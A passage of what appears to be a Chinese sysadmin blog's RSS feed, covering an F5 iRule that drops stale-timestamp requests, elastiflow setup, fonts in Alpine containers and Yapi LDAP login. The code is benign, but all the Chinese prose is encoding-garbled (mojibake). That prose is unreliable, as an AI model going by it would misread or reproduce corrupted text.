class=&#34;o&#34;&gt;=&lt;/span&gt;o2o&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;searchPanel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;wd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%E6%B4%9B%E4%B8%81%E6%96%B0&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;lat&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22.520712193695&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;lng&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;113.9233553732&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;city&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%E6%B7%B1%E5%9C%B3%E5%B8%82&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;90&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;unique&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;05685D2A5DAB8ABBD2E5E5B26E0C960F&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;versionName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5.7.5&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;plat&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;H5&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;platform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;H5&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2020-12-15%2014%3A19%3A11&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.0&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sign&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A6BD136BC1B6F91E5C7DD5A0DA03DD79&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;jsonp1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡Œé¢çš„tå€¼æ˜¯æ—¶é—´ï¼Œt=2020-12-15%2014%3A19%3A11&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªå€¼ä¸€ç›´ä¸å˜äº†ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœTå€¼è·Ÿå½“å‰æ—¶é—´å¯¹æ¯”ï¼Œæ˜¯3åˆ†é’Ÿå‰çš„ï¼Œé‚£å°±å°ï¼&lt;/p&gt;
&lt;p&gt;F5çš„iruleï¼Œç›´æ¥returnçš„æ˜¯ç™½åå•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;when&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTP_REQUEST&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;URI::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;URI::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;HTTP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;before&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clock&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scan&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;180 seconds ago&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;IP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;IP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;124.206.168.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;255.255.255.224&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]}&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;IP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;IP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;61.135.14.96&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;255.255.255.240&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]}&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;IP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;IP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;114.251.7.112&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;255.255.255.240&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]}&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tolower&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;HTTP::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;contains&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/cms/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$before&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clock&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scan&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]}&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>ç»ç‰ˆçš„elasticflowçš„å®‰è£…</title>
      <link>https://rendoumi.com/posts/20230724-elasticflow/</link>
      <pubDate>Mon, 24 Jul 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230724-elasticflow/</guid>
      <description>&lt;p&gt;elasticflow æ˜¯ä¸ªæµé‡åˆ†æå·¥å…·ï¼Œé€šè¿‡å¯¹å„ç§flowæµé‡çš„æŠ“å–ï¼Œåˆ†ææ•°æ®ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°å±€åŸŸç½‘ä¸­çš„æµé‡ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ç®¡çš„å¿…å¤‡å•Šã€‚é¦–å…ˆè¦æŠŠsflowæµé‡ç»™å‘è¿‡æ¥ã€‚(è¿™é‡Œ172.18.31.23æ˜¯æœåŠ¡å™¨ç«¯)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sflow collector &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ip 172.18.31.23 description flow-server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‹‰å–æºä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/robcowart/elastiflow
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯åŠ¨é›†ç¾¤&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™æ ·æ•´ä¸ªæ•°æ®ä¼šè¢«æ¸…ç©ºï¼Œéœ€è¦é‡æ–°ç”Ÿæˆä¸€éï¼Œå…ˆæŠŠkibanaçš„æ•°æ®æ–‡ä»¶æ‹‰å›æ¥&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/robcowart/elastiflow/master/kibana/elastiflow.kibana.7.8.x.ndjson
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç„¶åç™»å½•&lt;a href=&#34;http://172.18.31.23:5601&#34;&gt;http://172.18.31.23:5601&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å…ˆåˆ°é…ç½®ï¼Œå¯¼å…¥
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_111258.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯¼å…¥å¯¹è±¡ï¼Œé€‰æ‹©elastiflow.kibana.7.8.x.ndjsonæ–‡ä»¶ä¸Šä¼ 
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_111316.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯¼å…¥æˆåŠŸï¼Œå¯¼å…¥äº†300å¤šä¸ªå¯¹è±¡
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_111404.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åé…ç½®ç´¢å¼•ï¼Œåº”è¯¥ä¸ç”¨é…ï¼Œç›´æ¥é€‰ä¸€ä¸ªåšdefault
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_111511.png&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_111811.png&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_111841.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±okäº†ï¼Œå»dashboardçš„overviewå°±èƒ½çœ‹åˆ°ä¸œè¥¿äº†
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230724-elasticflow/2021-06-09_113220.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå»ä¿®æ”¹ä¸€ä¸‹shardç­–ç•¥ï¼Œçœå¾—ç´¢å¼•æŠ¥é»„è‰²&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PUT /_template/elastiflow-3.5.3
{
  &amp;#34;index_patterns&amp;#34;: &amp;#34;*&amp;#34;, 
  &amp;#34;settings&amp;#34;: {
    &amp;#34;number_of_shards&amp;#34;: 1
  }
}
PUT /_template/index_defaults 
{
  &amp;#34;index_patterns&amp;#34;: &amp;#34;*&amp;#34;,
  &amp;#34;settings&amp;#34;: {
  &amp;#34;number_of_shards&amp;#34;: 1
  }
}
PUT /_template/elastiflow-3.5.3
{
  &amp;#34;index_patterns&amp;#34;: &amp;#34;elastiflow-3.5.3-*&amp;#34;, 
  &amp;#34;settings&amp;#34;: {
    &amp;#34;number_of_shards&amp;#34;: 1
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æŸ¥çœ‹ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -s -X GET &amp;#39;http://localhost:9200/_cat/indices?v&amp;#39;
curl -s -X GET &amp;#39;http://localhost:9200/_template&amp;#39;| jq
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•åœ¨å®¹å™¨å†…å®‰è£…å­—ä½“æ–‡ä»¶</title>
      <link>https://rendoumi.com/posts/20230706-fonts_in_pod/</link>
      <pubDate>Thu, 06 Jul 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230706-fonts_in_pod/</guid>
      <description>&lt;p&gt;pod å®¹å™¨å†…è¦ç”¨ä¸­æ–‡é›…é»‘å­—ä½“ç”Ÿæˆ jpg å›¾ç‰‡ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æŠŠå­—ä½“ç»™è£…è¿›å»&lt;/p&gt;
&lt;p&gt;é¦–å…ˆè¿›å…¥å®¹å™¨ï¼Œç¡®å®šå®¹å™¨çš„åŸºåº•æ˜¯ä»€ä¹ˆï¼Œæ˜¯yumã€aptæˆ–è€…apk&lt;/p&gt;
&lt;p&gt;é€šå¸¸éƒ½æ˜¯ç”¨apkæœ€å°åŒ–å®‰è£…çš„ï¼Œè¿™æ ·åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk add --update ttf-dejavu fontconfig
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm -rf /var/cache/apk/*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /usr/share/fonts/chinese
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp /usr/local/jre1.8.0_201/lib/fonts/simsun.ttc /usr/share/fonts/chinese
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkfontscale &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mkfontdir &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; fc-cache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±æå®šäº†ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸´æ—¶çš„ã€‚&lt;/p&gt;
&lt;p&gt;è¦æƒ³é•¿ä¹…å°±å¾—ä¿®æ”¹Dockerfileï¼ŒæŠŠæ–‡ä»¶æ‹·è¿›å®¹å™¨ï¼Œç„¶ååŒæ ·å¾—æ‰§è¡Œå‘½ä»¤å³å¯ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>2023å¹´è·å¾—çš„è¯ä¹¦</title>
      <link>https://rendoumi.com/posts/20230630-certificates/</link>
      <pubDate>Fri, 30 Jun 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230630-certificates/</guid>
      <description>&lt;p&gt;2023å¹´ä¸ŠåŠå¹´ç»è¿‡åŠªåŠ›ï¼Œåˆè€ƒäº†3å¼ è¯ä¹¦ï¼Œä¸‹åŠå¹´ç»§ç»­åŠªåŠ›å¥‹æ–—&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230630161935782&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230630-certificates/image-20230630161935782.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230630162007269&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230630-certificates/image-20230630162007269.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230630162040982&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230630-certificates/image-20230630162040982.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Yapié›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯</title>
      <link>https://rendoumi.com/posts/20230412-freeipa_yapi/</link>
      <pubDate>Wed, 12 Apr 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230412-freeipa_yapi/</guid>
      <description>&lt;p&gt;Freeipaæ¥å…¥Yapi.&lt;/p&gt;
&lt;p&gt;vi my-api/config.json&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ldapLogin&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;enable&amp;#34;&lt;/span&gt;: true,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;server&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;ldap://ldap.bybon.cn&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;baseDn&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;bindPassword&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;searchDn&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;cn=users,cn=accounts,dc=bybon,dc=cn&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;searchStandard&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;mail&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;emailPostfix&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;@bybon.cn&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;emailKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;mail&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;usernameKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;displayName&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œvi my-yapi/vendors/server/controllers/user.js&lt;/p&gt;
&lt;p&gt;ç†ç”±å¦‚ä¸‹ï¼Œç™»å½•çš„æ—¶å€™ï¼Œyapiçš„é€»è¾‘æ˜¯å…ˆåˆ¤æ–­ç”¨æˆ·é‚®ä»¶ï¼ŒæŠŠé‚®ä»¶ä¸­çš„ç”¨æˆ·åæ‘˜å‡ºæ¥ï¼Œç„¶ååŠ ä¸Šé…ç½®ä¸­çš„é‚®ä»¶åŸŸã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªé€»è¾‘åœ¨ldapä¸­å°±ä¸å¯¹äº†ï¼Œæ”¹æˆå¦‚ä¸‹æ ¼å¼ï¼Œè¿™æ ·ç›´æ¥è¾“å…¥ldapç”¨æˆ·åå°±å¯ä»¥ç™»å½•äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  /**
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * ldapç™»å½•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @interface /user/login_by_ldap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @method
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @category user
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @foldnumber &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
